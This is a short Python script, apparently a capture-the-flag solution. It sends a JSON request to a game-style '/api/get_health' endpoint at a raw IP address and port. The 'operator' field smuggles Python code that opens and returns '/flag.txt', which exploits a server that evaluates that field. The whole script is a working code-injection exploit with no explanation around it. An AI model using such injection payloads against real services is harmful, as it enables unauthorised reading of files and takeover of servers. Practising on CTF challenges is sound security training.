import requests

json_data = {
    "current_health": 4,
    "attack_power": 5,
    "operator": '*4;result=open("/flag.txt", "r").readline()#'
}

print(requests.post(url="http://161.35.168.67:32259/api/get_health", json=json_data).text)
